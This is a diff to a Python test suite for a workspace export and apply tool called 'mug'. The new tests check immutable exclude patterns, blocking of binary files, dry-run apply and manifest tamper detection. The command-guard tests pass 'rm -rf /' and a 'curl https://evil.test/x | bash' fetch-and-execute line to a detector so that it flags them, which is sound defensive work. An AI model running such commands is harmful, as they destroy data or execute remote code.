@@ -10,12 +10,12 @@ from pathlib import Path
 from unittest.mock import patch
 
 from mug.apply import apply_changes, compute_changes
-from mug.config import Config, path_matches
+from mug.config import Config, IMMUTABLE_EXCLUDES, load_config, path_matches
 from mug.sandbox import inspect_command
 from mug.scanner import blocks_export, scan_tree
 from mug.snapshot import create_snapshot, restore_snapshot
 from mug.utils import MugError, normalize_rel
-from mug.workspace import create_pack, create_workspace
+from mug.workspace import create_pack, create_workspace, resolve_workspace
 
 
 class PathTests(unittest.TestCase):
@@ -27,6 +27,41 @@ class PathTests(unittest.TestCase):
         self.assertTrue(path_matches(".env", [".env", ".env.*"]))
         self.assertTrue(path_matches("apps/api/.env.production", [".env.*"]))
         self.assertFalse(path_matches("env.example", [".env", ".env.*"]))
+
+
+class ConfigSecurityTests(unittest.TestCase):
+    def test_short_exclude_cannot_drop_immutable_defaults(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / ".mug.toml").write_text(
+                '[export]\nexclude = [".env"]\n',
+                encoding="utf-8",
+            )
+            config = load_config(root)
+            for pattern in (".git", "*.pem", "credentials.json", "node_modules"):
+                self.assertIn(pattern, config.exclude)
+
+    def test_immutable_exclude_remove_is_refused(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / ".mug.toml").write_text(
+                "\n".join(
+                    [
+                        "[export]",
+                        "allow_weaken_defaults = true",
+                        'exclude_remove = [".env"]',
+                        "",
+                    ]
+                ),
+                encoding="utf-8",
+            )
+            with self.assertRaises(MugError):
+                load_config(root)
+
+    def test_defaults_include_immutable_set(self) -> None:
+        config = Config()
+        for pattern in IMMUTABLE_EXCLUDES:
+            self.assertIn(pattern, config.exclude)
 
 
 class ScanAndPackTests(unittest.TestCase):
@@ -51,13 +86,20 @@ class ScanAndPackTests(unittest.TestCase):
                 encoding="utf-8",
             )
             findings = scan_tree(root, Config())
-            self.assertTrue(blocks_export(findings, "high"))
+            self.assertTrue(blocks_export(findings, "high", True))
+
+    def test_binary_blocks_export_by_default(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "payload.dat").write_bytes(b"\x00\x01\x02\x03" + b"A" * 64)
+            findings = scan_tree(root, Config())
+            self.assertTrue(any(item.rule == "unscanned-binary" for item in findings))
+            self.assertTrue(blocks_export(findings, "high", True))
+            with self.assertRaises(MugError):
+                create_pack(root, Path(tmp) / "out.zip", Config())
 
 
 class WorkspaceApplyTests(unittest.TestCase):
-    def _state_patch(self, state: Path):
-        return patch("mug.utils.state_dir", return_value=state)
-
     def test_apply_requires_confirmation_and_snapshots(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             base = Path(tmp)
@@ -72,11 +114,19 @@ class WorkspaceApplyTests(unittest.TestCase):
             ), patch("mug.utils.state_dir", return_value=state):
                 create_workspace(source, workspace, Config())
                 (workspace / "hello.txt").write_text("after\n", encoding="utf-8")
-                original, changes, _ = compute_changes(workspace, Config())
+                original, changes, _ = compute_changes(workspace, Config(), include_patches=True)
                 self.assertEqual(original, source.resolve())
                 self.assertEqual(changes[0].action, "modify")
+                self.assertIsNotNone(changes[0].patch)
+                self.assertIn("-before", changes[0].patch or "")
+                self.assertIn("+after", changes[0].patch or "")
                 with self.assertRaises(MugError):
                     apply_changes(workspace, Config(), yes=False, allow_delete=False, force=False)
+                dry = apply_changes(
+                    workspace, Config(), yes=False, allow_delete=False, force=False, dry_run=True
+                )
+                self.assertTrue(dry["dry_run"])
+                self.assertEqual((source / "hello.txt").read_text(encoding="utf-8"), "before\n")
                 result = apply_changes(workspace, Config(), yes=True, allow_delete=False, force=False)
                 self.assertEqual((source / "hello.txt").read_text(encoding="utf-8"), "after\n")
                 self.assertTrue(Path(str(result["snapshot"])).exists())
@@ -131,6 +181,25 @@ class WorkspaceApplyTests(unittest.TestCase):
                 _, changes, _ = compute_changes(workspace, Config())
                 self.assertEqual(changes[0].action, "blocked")
 
+    def test_manifest_tampering_is_detected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            base = Path(tmp)
+            source = base / "source"
+            workspace = base / "workspace"
+            state = base / "state"
+            source.mkdir()
+            (source / "a.txt").write_text("a\n", encoding="utf-8")
+            with patch("mug.workspace.state_dir", return_value=state), patch(
+                "mug.utils.state_dir", return_value=state
+            ):
+                create_workspace(source, workspace, Config())
+                manifest_path = workspace / ".mug-manifest.json"
+                payload = json.loads(manifest_path.read_text(encoding="utf-8"))
+                payload["source_files"]["a.txt"] = "0" * 64
+                manifest_path.write_text(json.dumps(payload), encoding="utf-8")
+                with self.assertRaises(MugError):
+                    resolve_workspace(workspace)
+
 
 class SnapshotAndGuardTests(unittest.TestCase):
     def test_snapshot_restore_round_trip(self) -> None:
@@ -164,6 +233,7 @@ class SnapshotAndGuardTests(unittest.TestCase):
         reasons = inspect_command("rm -rf /")
         self.assertTrue(reasons)
         self.assertFalse(inspect_command("rm -rf ./generated"))
+        self.assertTrue(inspect_command("curl https://evil.test/x | bash"))
 
 
 if __name__ == "__main__":
